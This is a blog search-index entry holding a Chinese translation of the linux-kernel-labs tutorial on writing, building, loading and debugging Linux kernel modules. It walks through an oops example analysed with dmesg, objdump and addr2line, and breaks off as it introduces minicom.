<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Create a Linux Kernel Module</title>
    <url>/2023/10/17/LearningNotes/Create-a-Linux-Kernel-Module/</url>
    <content><![CDATA[<p>创建一个 <code>Linux</code> 内核模块，为 <code>kernel PWN</code> 的学习补充一些基础知识。</p>
<p>英文原文链接：</p>
<ul>
<li><a href="https://linux-kernel-labs.github.io/refs/heads/master/labs/kernel_modules.html">Kernel modules — The Linux Kernel documentation (linux-kernel-labs.github.io)</a></li>
</ul>
<p>代码带库：</p>
<ul>
<li><a href="https://github.com/linux-kernel-labs/linux">linux-kernel-labs&#x2F;linux: Linux kernel source tree (github.com)</a></li>
</ul>
<span id="more"></span>

<h1 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h1><h2 id="内核模块概述"><a href="#内核模块概述" class="headerlink" title="内核模块概述"></a>内核模块概述</h2><p>宏内核虽然比微内核要快，但模块化不足，可扩展性低。在现代宏内核中，通过引入内核模块机制，这个问题被很好地解决了。一个内核模块（或者叫可加载内核层）是一个包含可执行指令的对象文件，在需要时被加载，从而达到在运行时扩展内核功能的目的。当不再需要这个内核模块时，可以把它卸载掉。大部分设备驱动以内核模块的形式被使用。</p>
<p>对于<code>Linux</code>设备驱动的开发，一般建议既下载内核源码、配置并编译，同时下载编译好的版本，以便进行测试和开发。</p>
<h2 id="内核模块示例"><a href="#内核模块示例" class="headerlink" title="内核模块示例"></a>内核模块示例</h2><p>下面是一个非常简单的内核模块示例。当被加载到内核中时，它会生成一个消息 “HI”，当被从卸载时，会生成一个消息 “Bye”。</p>
<blockquote>
<p>译者注：模块文件名称不能是 module，本文使用 modul</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;My kernel module&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Me&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">dummy_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        printk(<span class="string">&quot;Hi\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">dummy_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        printk(<span class="string">&quot;Bye\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(dummy_init);</span><br><span class="line">module_exit(dummy_exit);</span><br></pre></td></tr></table></figure>

<p>生成的消息不会在终端中展示，而是会被保存到一个特殊的内存区域，我们可以使用日志守护进程 <code>syslog</code> 获取它们。为了展示内核消息，可以使用 <code>dmesg</code> 命令或者查看系统日志。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">dmesg | <span class="built_in">tail</span> -2</span></span><br><span class="line">Hi</span><br><span class="line">Bye</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> /var/log/syslog | <span class="built_in">tail</span> -2</span></span><br><span class="line">Feb 20 13:57:38 asgard kernel: Hi</span><br><span class="line">Feb 20 13:57:43 asgard kernel: Bye</span><br></pre></td></tr></table></figure>

<h2 id="编译内核模块"><a href="#编译内核模块" class="headerlink" title="编译内核模块"></a>编译内核模块</h2><p>编译内核模块和编译用户程序有所不同。首先，要使用一些不同的头文件，且模块不应该链接到任何的库。同时，不能不提的是，模块编译选项必须和目标内核编译时用的选项保持一致。出于这些原因，我们可以使用一个标准的内核模块编译方法（kbuild）。这种方法使用到两个文件：一个 <code>Makefile</code> 和一个 <code>Kbuild</code> 文件。</p>
<p>下面是一个 <code>Makefile</code> 的示例：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">KDIR = /lib/modules/`uname -r`/build</span><br><span class="line"><span class="comment"># 译者注：这样得到的内核源码目录不一定正确，还需根据实际情况进行调整</span></span><br><span class="line"></span><br><span class="line"><span class="section">kbuild:</span></span><br><span class="line">        make -C <span class="variable">$(KDIR)</span> M=`pwd`</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">        make -C <span class="variable">$(KDIR)</span> M=`pwd` clean</span><br></pre></td></tr></table></figure>

<p>一个 <code>Kbuild</code> 示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">EXTRA_CFLAGS = -Wall -g</span><br><span class="line"></span><br><span class="line">obj-m        = modul.o</span><br></pre></td></tr></table></figure>

<p>正如所见，对 <code>Makefile</code> 调用 <code>make</code>会导致在内核源码目录（KDIR）中调用 <code>make</code>，并引用当前目录（M&#x3D;<code>pwd</code>）。这个过程最终导致从当前目录中读取 <code>Kbuild</code> 文件，并按照该文件中的指示编译模块。</p>
<blockquote>
<p>Note.</p>
<p>当使用从其他地方下载来的Linux源码，而不是本机源码时，需调整 KDIR 至对应内核源码目录。</p>
<p>如：KDIR &#x3D; &#x2F;home&#x2F;student&#x2F;src&#x2F;linux</p>
</blockquote>
<p><code>Kbuild</code> 文件中包含一条或多条用于编译内核模块的指令，最简单的指令示例如：obj-m &#x3D; module.o  根据这条指令，一个内核模块（内核对象ko - kernel object），会从 <code>module.o</code>文件开始创建。<code>module.o</code> 会从 <code>module.c</code> 或 <code>module.S</code> 文件中读取。这些文件都应能在 <code>Kbuild</code> 所在目录中找到。</p>
<p>一个使用多个子模块的 <code>Kbuild</code> 文件示例如下：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">EXTRA_CFLAGS = -Wall -g</span><br><span class="line"></span><br><span class="line">obj-m = supermodule.o</span><br><span class="line">supermodule-y = module-a.o module-b.o</span><br></pre></td></tr></table></figure>

<p>对于上面的示例，编译步骤如下：</p>
<ul>
<li>编译 <code>module-a.c</code> 和 <code>module-b.c</code> 源码文件，得到 <code>module-a.c</code> 和 <code>module-b.o</code> 对象文件</li>
<li>将 <code>module-a.c</code> 和 <code>module-b.o</code> 链接成 <code>supermodule.o</code></li>
<li>最后从 <code>supermodule.o</code> 可以创建 <code>supermodule.ko</code> 模块</li>
</ul>
<p><code>Kbuild</code> 中目标名称的后缀，决定了它们会被如何使用，规则如下：</p>
<ul>
<li><p>M（module）指可加载内核模块目标</p>
</li>
<li><p>Y（yes）表示一个编译得到的，且还会被链接到内核模块（$(module_name)-y）或链接进内核（obj-y）的对象目标</p>
</li>
<li><p>所有其它的目标名称后缀。都会被 <code>Kbuild</code>忽略，且对应文件不会被编译。</p>
</li>
</ul>
<blockquote>
<p>Note.</p>
<p>这些后缀可以方便使用<code>make menuconfig</code>命令或直接编辑<code>.config</code>文件配置内核。<code>.config</code>文件设置了一系列变量，用于确定在构建时将哪些功能添加到内核中。</p>
<p>例如，当使用<code>make menuconfig</code>添加<code>BTRFS</code>支持时，会将<code>CONFIG BTRFS FS=y</code>行添加到<code>.config</code>文件中。原本<code>BTRFS kbuild</code>包含行<code>obj-$（CONFIG BTRFS FS）：=BTRFS.o</code>，现在该行会变为<code>obj-y：=BTRFS.</code>o。这将编译<code>BTRFS.0</code>对象并将其链接到内核。在设置变量之前，该行变为<code>obj:=btrfs.o</code>，因此它被忽略，构建得到的内核也就不支持<code>BTRFS </code>。</p>
</blockquote>
<h2 id="内核模块的加载和卸载"><a href="#内核模块的加载和卸载" class="headerlink" title="内核模块的加载和卸载"></a>内核模块的加载和卸载</h2><p>加载模块使用<code>insmod</code>命令，接收内核模块路径作参数；卸载模块使用<code>rmmod</code>命令，使用模块名称作为参数。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">insmod modul.ko</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rmmod modul.ko</span></span><br></pre></td></tr></table></figure>

<p>加载内核模块时，会执行被指定为<code>module_init</code>宏参数的例程。类似地，当卸载模块时，会执行被指定为<code>module_exit</code>宏参数的例程。</p>
<p>一个内核模块完整的编译、加载、卸载的过程如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">faust:~/lab-01/modul-lin# ls</span><br><span class="line">Kbuild  Makefile  modul.c</span><br><span class="line"></span><br><span class="line">faust:~/lab-01/modul-lin# make</span><br><span class="line">make -C /lib/modules/`uname -r`/build M=`pwd`</span><br><span class="line">make[1]: Entering directory `/usr/src/linux-2.6.28.4&#x27;</span><br><span class="line">  LD      /root/lab-01/modul-lin/built-in.o</span><br><span class="line">  CC [M]  /root/lab-01/modul-lin/modul.o</span><br><span class="line">  Building modules, stage 2.</span><br><span class="line">  MODPOST 1 modules</span><br><span class="line">  CC      /root/lab-01/modul-lin/modul.mod.o</span><br><span class="line">  LD [M]  /root/lab-01/modul-lin/modul.ko</span><br><span class="line">make[1]: Leaving directory `/usr/src/linux-2.6.28.4&#x27;</span><br><span class="line"></span><br><span class="line">faust:~/lab-01/modul-lin# ls</span><br><span class="line">built-in.o  Kbuild  Makefile  modul.c  Module.markers</span><br><span class="line">modules.order  Module.symvers  modul.ko  modul.mod.c</span><br><span class="line">modul.mod.o  modul.o</span><br><span class="line"></span><br><span class="line">faust:~/lab-01/modul-lin# insmod modul.ko</span><br><span class="line"></span><br><span class="line">faust:~/lab-01/modul-lin# dmesg | tail -1</span><br><span class="line">Hi</span><br><span class="line"></span><br><span class="line">faust:~/lab-01/modul-lin# rmmod modul</span><br><span class="line"></span><br><span class="line">faust:~/lab-01/modul-lin# dmesg | tail -2</span><br><span class="line">Hi</span><br><span class="line">Bye</span><br></pre></td></tr></table></figure>

<p>已加载模块的信息，可以通过<code>lsmod</code>命令进行查看，也可以通过 <code>/proc/modules</code>文件 和 <code>/sys/module</code>目录进行查看。</p>
<h2 id="内核模块调试"><a href="#内核模块调试" class="headerlink" title="内核模块调试"></a>内核模块调试</h2><p>对内核模块进行故障排除比调试常规程序要复杂得多。首先，内核模块中的错误可能导致整个系统阻塞，因此故障排除也就慢很多。为了避免重启，推荐使用虚拟机（如qemu，virtualbox，vmware等）。</p>
<p>当一个包含<code>bug</code>的内核模块被加载到内核中时，最终会生成一个内核<code>oops</code>。内核<code>oops</code>是内核检测到的无效操作，只能由内核产生。对于稳定的内核版本，<code>oops</code>的产生几乎可以肯定地意味着内核模块中存在<code>bug</code>。在<code>oops</code>出现后，内核会继续工作。</p>
<p>保存<code>oops</code>出现时内核发出的消息是很重要的，和上面提到的一样，内核产生的消息被保存到日志中，能够使用<code>dmesg</code>命令进行展示。为了不丢失任何的内核消息，推荐直接从控制台终端插入&#x2F;测试内核模块，或者定期查看内核消息。值得注意的是，<code>oops</code>的产生既可能是因为一个编程错误，也可能是因为一个错误。</p>
<p>如果出现一个致命的错误，导致系统无法返回到一个稳定态，会产生一个内核<code>panic</code>。</p>
<p>下面是一个包含bug，会产生<code>oops</code>的内核模块源码示例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Oops generating kernel module</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION (<span class="string">&quot;Oops&quot;</span>);</span><br><span class="line">MODULE_LICENSE (<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR (<span class="string">&quot;PSO&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OP_READ         0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OP_WRITE        1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OP_OOPS         OP_WRITE</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">my_oops_init</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> *a;</span><br><span class="line"></span><br><span class="line">        a = (<span class="type">int</span> *) <span class="number">0x00001234</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> OP_OOPS == OP_WRITE</span></span><br><span class="line">        *a = <span class="number">3</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> OP_OOPS == OP_READ</span></span><br><span class="line">        printk (KERN_ALERT <span class="string">&quot;value = %d\n&quot;</span>, *a);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">error</span> <span class="string">&quot;Unknown op for oops!&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">my_oops_exit</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init (my_oops_init);</span><br><span class="line">module_exit (my_oops_exit);</span><br></pre></td></tr></table></figure>

<p>将这个模块插入到内核中时，会产生一个<code>oops</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">faust:~/lab<span class="number">-01</span>/modul-oops<span class="meta"># insmod oops.ko</span></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">faust:~/lab<span class="number">-01</span>/modul-oops<span class="meta"># dmesg | tail -32</span></span><br><span class="line">BUG: unable to handle kernel paging request at <span class="number">00001234</span></span><br><span class="line">IP: [&lt;c89d4005&gt;] my_oops_init+<span class="number">0x5</span>/<span class="number">0x20</span> [oops]</span><br><span class="line">  *de = <span class="number">00000000</span></span><br><span class="line">Oops: <span class="number">0002</span> [#<span class="number">1</span>] PREEMPT DEBUG_PAGEALLOC</span><br><span class="line">last sysfs file: /sys/devices/virtual/net/lo/operstate</span><br><span class="line">Modules linked in: oops(+) netconsole ide_cd_mod pcnet32 crc32 cdrom [last unloaded: modul]</span><br><span class="line"></span><br><span class="line">Pid: <span class="number">4157</span>, comm: insmod Not tainted (<span class="number">2.6</span><span class="number">.28</span><span class="number">.4</span> #<span class="number">2</span>) VMware Virtual Platform</span><br><span class="line">EIP: <span class="number">0060</span>:[&lt;c89d4005&gt;] EFLAGS: <span class="number">00010246</span> CPU: <span class="number">0</span></span><br><span class="line">EIP is at my_oops_init+<span class="number">0x5</span>/<span class="number">0x20</span> [oops]</span><br><span class="line">EAX: <span class="number">00000000</span> EBX: fffffffc ECX: c89d4300 EDX: <span class="number">00000001</span></span><br><span class="line">ESI: c89d4000 EDI: <span class="number">00000000</span> EBP: c5799e24 ESP: c5799e24</span><br><span class="line"> DS: <span class="number">007b</span> ES: <span class="number">007b</span> FS: <span class="number">0000</span> GS: <span class="number">0033</span> SS: <span class="number">0068</span></span><br><span class="line">Process insmod (pid: <span class="number">4157</span>, ti=c5799000 task=c665c780 task.ti=c5799000)</span><br><span class="line">Stack:</span><br><span class="line"> c5799f8c c010102d c72b51d8 <span class="number">0000000</span>c c5799e58 c01708e4 <span class="number">00000124</span> <span class="number">00000000</span></span><br><span class="line"> c89d4300 c5799e58 c724f448 <span class="number">00000001</span> c89d4300 c5799e60 c0170981 c5799f8c</span><br><span class="line"> c014b698 <span class="number">00000000</span> <span class="number">00000000</span> c5799f78 c5799f20 <span class="number">00000500</span> c665cb00 c89d4300</span><br><span class="line">Call Trace:</span><br><span class="line"> [&lt;c010102d&gt;] ? _stext+<span class="number">0x2d</span>/<span class="number">0x170</span></span><br><span class="line"> [&lt;c01708e4&gt;] ? __vunmap+<span class="number">0xa4</span>/<span class="number">0xf0</span></span><br><span class="line"> [&lt;c0170981&gt;] ? vfree+<span class="number">0x21</span>/<span class="number">0x30</span></span><br><span class="line"> [&lt;c014b698&gt;] ? load_module+<span class="number">0x19b8</span>/<span class="number">0x1a40</span></span><br><span class="line"> [&lt;c035e965&gt;] ? __mutex_unlock_slowpath+<span class="number">0xd5</span>/<span class="number">0x140</span></span><br><span class="line"> [&lt;c0140da6&gt;] ? trace_hardirqs_on_caller+<span class="number">0x106</span>/<span class="number">0x150</span></span><br><span class="line"> [&lt;c014b7aa&gt;] ? sys_init_module+<span class="number">0x8a</span>/<span class="number">0x1b0</span></span><br><span class="line"> [&lt;c0140da6&gt;] ? trace_hardirqs_on_caller+<span class="number">0x106</span>/<span class="number">0x150</span></span><br><span class="line"> [&lt;c0240a08&gt;] ? trace_hardirqs_on_thunk+<span class="number">0xc</span>/<span class="number">0x10</span></span><br><span class="line"> [&lt;c0103407&gt;] ? sysenter_do_call+<span class="number">0x12</span>/<span class="number">0x43</span></span><br><span class="line">Code: &lt;c7&gt; <span class="number">05</span> <span class="number">34</span> <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">5</span>d c3 eb <span class="number">0</span>d <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line">EIP: [&lt;c89d4005&gt;] my_oops_init+<span class="number">0x5</span>/<span class="number">0x20</span> [oops] SS:ESP <span class="number">0068</span>:c5799e24</span><br><span class="line">---[ end trace <span class="number">2981</span>ce73ae801363 ]---</span><br></pre></td></tr></table></figure>

<p>尽管相对神秘，内核给出的消息提供了出现<code>oops</code>错误的重要信息。第一行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">BUG: unable to handle kernel paging request at 00001234</span><br><span class="line">EIP: [&lt;c89d4005&gt;] my_oops_init + 0x5 / 0x20 [oops]</span><br></pre></td></tr></table></figure>

<p>告诉我们产生错误的原因，和造成错误的指令的地址。本例中，这是一个无效内存地址获取。</p>
<p>下一行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Oops: 0002 [# 1] PREEMPT DEBUG_PAGEALLOC</span><br></pre></td></tr></table></figure>

<p>告诉我们这是第一个<code>oops</code>(#1)，在一个<code>oops</code>可能导致其它<code>oops</code>时，这一点是很重要的。通常，我们要关注的是第一个<code>oops</code>。此外，<code>oops code</code>（0002）标明了错误类型（见<code>arch/x86/include/asm/trap_pf.h</code>）：</p>
<ul>
<li>Bit 0 &#x3D;&#x3D; 0 表示找不到页，1 表示页保护错误</li>
<li>Bit 1 &#x3D;&#x3D; 0 表示读，1 表示写</li>
<li>Bit 2 &#x3D;&#x3D; 0 表示内核模式，1 表示用户模式</li>
</ul>
<p>在本例中，产生<code>oops</code>(Bit 1 &#x3D;&#x3D; 1)的原因是，尝试在<code>内核模式</code>向一个<code>找不到的内存页</code>执行<code>写操作</code>。</p>
<p>下面使用<code>dmesg</code>产看日志，可以看到寄存器的转储信息，给出了<code>EIP</code>寄存器的值，同时可以注意到<code>bug</code>出现在<code>my_oops_init</code>函数，偏移为5字节(<code>EIP: [&lt;c89d4005&gt;] my_oops_init+0x5</code>)（译者注：？），同时消息还展示了堆栈内容和在<code>oops</code>出现前的调用回溯。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">faust:~/lab-01/modul-oops# dmesg | tail -33</span><br><span class="line">BUG: unable to handle kernel paging request at 00001234</span><br><span class="line">IP: [&lt;c89c3016&gt;] my_oops_init+0x6/0x20 [oops]</span><br><span class="line">  *de = 00000000</span><br><span class="line">Oops: 0000 [#1] PREEMPT DEBUG_PAGEALLOC</span><br><span class="line">last sysfs file: /sys/devices/virtual/net/lo/operstate</span><br><span class="line">Modules linked in: oops(+) netconsole pcnet32 crc32 ide_cd_mod cdrom</span><br><span class="line"></span><br><span class="line">Pid: 2754, comm: insmod Not tainted (2.6.28.4 #2) VMware Virtual Platform</span><br><span class="line">EIP: 0060:[&lt;c89c3016&gt;] EFLAGS: 00010292 CPU: 0</span><br><span class="line">EIP is at my_oops_init+0x6/0x20 [oops]</span><br><span class="line">EAX: 00000000 EBX: fffffffc ECX: c89c3380 EDX: 00000001</span><br><span class="line">ESI: c89c3010 EDI: 00000000 EBP: c57cbe24 ESP: c57cbe1c</span><br><span class="line"> DS: 007b ES: 007b FS: 0000 GS: 0033 SS: 0068</span><br><span class="line">Process insmod (pid: 2754, ti=c57cb000 task=c66ec780 task.ti=c57cb000)</span><br><span class="line">Stack:</span><br><span class="line"> c57cbe34 00000282 c57cbf8c c010102d c57b9280 0000000c c57cbe58 c01708e4</span><br><span class="line"> 00000124 00000000 c89c3380 c57cbe58 c5db1d38 00000001 c89c3380 c57cbe60</span><br><span class="line"> c0170981 c57cbf8c c014b698 00000000 00000000 c57cbf78 c57cbf20 00000580</span><br><span class="line">Call Trace:</span><br><span class="line"> [&lt;c010102d&gt;] ? _stext+0x2d/0x170</span><br><span class="line"> [&lt;c01708e4&gt;] ? __vunmap+0xa4/0xf0</span><br><span class="line"> [&lt;c0170981&gt;] ? vfree+0x21/0x30</span><br><span class="line"> [&lt;c014b698&gt;] ? load_module+0x19b8/0x1a40</span><br><span class="line"> [&lt;c035d083&gt;] ? printk+0x0/0x1a</span><br><span class="line"> [&lt;c035e965&gt;] ? __mutex_unlock_slowpath+0xd5/0x140</span><br><span class="line"> [&lt;c0140da6&gt;] ? trace_hardirqs_on_caller+0x106/0x150</span><br><span class="line"> [&lt;c014b7aa&gt;] ? sys_init_module+0x8a/0x1b0</span><br><span class="line"> [&lt;c0140da6&gt;] ? trace_hardirqs_on_caller+0x106/0x150</span><br><span class="line"> [&lt;c0240a08&gt;] ? trace_hardirqs_on_thunk+0xc/0x10</span><br><span class="line"> [&lt;c0103407&gt;] ? sysenter_do_call+0x12/0x43</span><br><span class="line">Code: &lt;a1&gt; 34 12 00 00 c7 04 24 54 30 9c c8 89 44 24 04 e8 58 a0 99 f7 31</span><br><span class="line">EIP: [&lt;c89c3016&gt;] my_oops_init+0x6/0x20 [oops] SS:ESP 0068:c57cbe1c</span><br><span class="line">---[ end trace 45eeb3d6ea8ff1ed ]---</span><br></pre></td></tr></table></figure>

<p>如果生成一个无效的读调用(<code>#define OP_OOPS OP_READ</code>)，消息基本会是相同的，但是<code>oops code</code>会变成 <code>0000</code>。</p>
<h3 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h3><p>使用<code>objdump</code>工具，可以获得导致<code>oops</code>的指令的详细信息。常用指令有两个，<code>-d</code>用于反汇编，<code>-S</code>用于交织显示<code>C</code>代码和汇编代码，一般组合使用<code>-dS</code>。为了提高解码效率，我们需要用到内核模块的加载地址，它可以在<code>/proc/modules</code>中找到。</p>
<p>下面是一个示例，对上面的内核模块使用<code>objdump</code>命令，识别生成<code>oops</code>的指令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">faust:~/lab-01/modul-oops# cat /proc/modules</span><br><span class="line">oops 1280 1 - Loading 0xc89d4000</span><br><span class="line">netconsole 8352 0 - Live 0xc89ad000</span><br><span class="line">pcnet32 33412 0 - Live 0xc895a000</span><br><span class="line">ide_cd_mod 34952 0 - Live 0xc8903000</span><br><span class="line">crc32 4224 1 pcnet32, Live 0xc888a000</span><br><span class="line">cdrom 34848 1 ide_cd_mod, Live 0xc886d000</span><br><span class="line"></span><br><span class="line">faust:~/lab-01/modul-oops# objdump -dS --adjust-vma=0xc89d4000 oops.ko</span><br><span class="line"></span><br><span class="line">oops.ko:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">c89d4000 &lt;init_module&gt;:</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define OP_READ         0</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define OP_WRITE        1</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define OP_OOPS         OP_WRITE</span></span><br><span class="line"></span><br><span class="line">static int my_oops_init (void)</span><br><span class="line">&#123;</span><br><span class="line">c89d4000:       55                      push   %ebp</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="keyword">else</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">error <span class="string">&quot;Unknown op for oops!&quot;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">endif</span></span><br><span class="line"></span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line">c89d4001:       31 c0                   xor    %eax,%eax</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define OP_READ         0</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define OP_WRITE        1</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">define OP_OOPS         OP_WRITE</span></span><br><span class="line"></span><br><span class="line">static int my_oops_init (void)</span><br><span class="line">&#123;</span><br><span class="line">c89d4003:       89 e5                   mov    %esp,%ebp</span><br><span class="line">        int *a;</span><br><span class="line"></span><br><span class="line">        a = (int *) 0x00001234;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="keyword">if</span> OP_OOPS == OP_WRITE</span></span><br><span class="line">        *a = 3;</span><br><span class="line">c89d4005:       c7 05 34 12 00 00 03    movl   $0x3,0x1234</span><br><span class="line">c89d400c:       00 00 00</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="keyword">else</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">error <span class="string">&quot;Unknown op for oops!&quot;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">endif</span></span><br><span class="line"></span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line">c89d400f:       5d                      pop    %ebp</span><br><span class="line">c89d4010:       c3                      ret</span><br><span class="line">c89d4011:       eb 0d                   jmp    c89c3020 &lt;cleanup_module&gt;</span><br><span class="line">c89d4013:       90                      nop</span><br><span class="line">c89d4014:       90                      nop</span><br><span class="line">c89d4015:       90                      nop</span><br><span class="line">c89d4016:       90                      nop</span><br><span class="line">c89d4017:       90                      nop</span><br><span class="line">c89d4018:       90                      nop</span><br><span class="line">c89d4019:       90                      nop</span><br><span class="line">c89d401a:       90                      nop</span><br><span class="line">c89d401b:       90                      nop</span><br><span class="line">c89d401c:       90                      nop</span><br><span class="line">c89d401d:       90                      nop</span><br><span class="line">c89d401e:       90                      nop</span><br><span class="line">c89d401f:       90                      nop</span><br><span class="line"></span><br><span class="line">c89d4020 &lt;cleanup_module&gt;:</span><br><span class="line"></span><br><span class="line">static void my_oops_exit (void)</span><br><span class="line">&#123;</span><br><span class="line">c89d4020:       55                      push   %ebp</span><br><span class="line">c89d4021:       89 e5                   mov    %esp,%ebp</span><br><span class="line">&#125;</span><br><span class="line">c89d4023:       5d                      pop    %ebp</span><br><span class="line">c89d4024:       c3                      ret</span><br><span class="line">c89d4025:       90                      nop</span><br><span class="line">c89d4026:       90                      nop</span><br><span class="line">c89d4027:       90                      nop</span><br></pre></td></tr></table></figure>

<p>可以看到，上面得到的造成<code>oops</code>的指令的地址（c89d4005）处的内容是：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C89d4005: c7 05 34 12 00 00 03 movl $ 0x3,0x1234</span><br></pre></td></tr></table></figure>

<p>这正是我们期望的——在<code>0x0001234</code>处存储<code>3</code>。</p>
<p><code>/proc/modules</code>中包含内核模块的加载地址，<code>--adjust-vma</code>选项允许我们展示和<code>0xc89d4000</code>相关的指令。</p>
<p><code>-l</code>选项展示插入到汇编代码中的<code>C</code>源码的行号。</p>
<h3 id="addr2line"><a href="#addr2line" class="headerlink" title="addr2line"></a>addr2line</h3><p>一个更简单地找到造成<code>oops</code>的指令的方式，是使用<code>addr2line</code>工具：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">faust:~/lab-01/modul-oops# addr2line -e oops.o 0x5</span><br><span class="line">/root/lab-01/modul-oops/oops.c:23</span><br></pre></td></tr></table></figure>

<p>其中<code>0x5</code>是生成<code>oops</code>的指令的程序计数（<code>EIP=c89d4005</code>）减去模块加载基址（0xc89d4000，可在<code>/proc/modules</code>中查看）后的值。</p>
<h3 id="minicom"><a href="#minicom" class="headerlink" title="minicom"></a>minicom</h3><p><code>minicom</code>（或其他等效程序，如 <code>picocom</code>, <code>screen</code>），是一个能够用于连接串行端口并与之交互的工具。使用串行端口实在开发阶段分析内核消息或与嵌入式系统进行交互的基本方法。有两种常见的连接方式：</p>
<ul>
<li>我们将使用的设备的<strong>串行端口</strong>是<code>/dev/ttyS0</code></li>
<li>我们将使用的设备的<code>USB</code>端口（FTDI）是<code>/dev/ttyUSB</code></li>
</ul>
<p>如果使用虚拟机，虚拟机启动时会显示我们使用的设备。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">char device redirected to /dev/pts/20 (label virtiocon0)</span><br></pre></td></tr></table></figure>

<p><code>minicom</code>使用示例：</p>
